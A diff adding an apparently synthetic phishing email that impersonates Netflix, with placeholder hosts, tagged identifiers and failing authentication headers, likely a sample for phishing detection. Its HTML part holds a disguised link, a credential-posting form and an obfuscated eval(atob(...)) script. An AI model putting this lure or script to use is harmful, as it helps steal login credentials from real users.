@@ -1,0 +1,34 @@
+From: notice@netflix-account.pages.dev
+To: victim53@example.com
+Subject: Access notice from Netflix [ref F7CB721]
+Date: Tue, 28 Mar 2002 09:00:00 -0500
+Message-ID: <phish-113-b41cabd2-cb05-4634-857e-d12cc0fcdb37@netflix-account.pages.dev>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 28 Mar 2002 10:44:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 20 Mar 2002 09:13:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 09 Mar 2002 20:24:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 08 Mar 2002 20:50:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 11 Mar 2002 23:46:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 01 Mar 2002 15:51:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 15 Mar 2002 05:01:00 -0500
+Return-Path: <bounce@mail-1608f6ef.top>
+Reply-To: recovery3@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-1608f6ef.top; dkim=fail header.d=netflix-account.pages.dev; dmarc=fail header.from=netflix-account.pages.dev
+Received-SPF: fail (mx.example.com: domain of notice@netflix-account.pages.dev does not designate 192.0.2.44 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=netflix-account.pages.dev; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-113-2014d489"
+
+--bnd-p-113-2014d489
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+A new access notice is available for your profile.
+Review it here: https://login.secure.netflix-account.pages.dev/auth?t=F7CB721
+
+Reference: F7CB721
+--bnd-p-113-2014d489
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>A new access notice is available for your profile.<br/>Review it here: https://login.secure.netflix-account.pages.dev/auth?t=F7CB721<br/><br/>Reference: F7CB721</p><p><a href="http://netflix-account.pages.dev/login">https://www.netflix.com/signin</a></p><form action="http://netflix-account.pages.dev/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-113-2014d489--
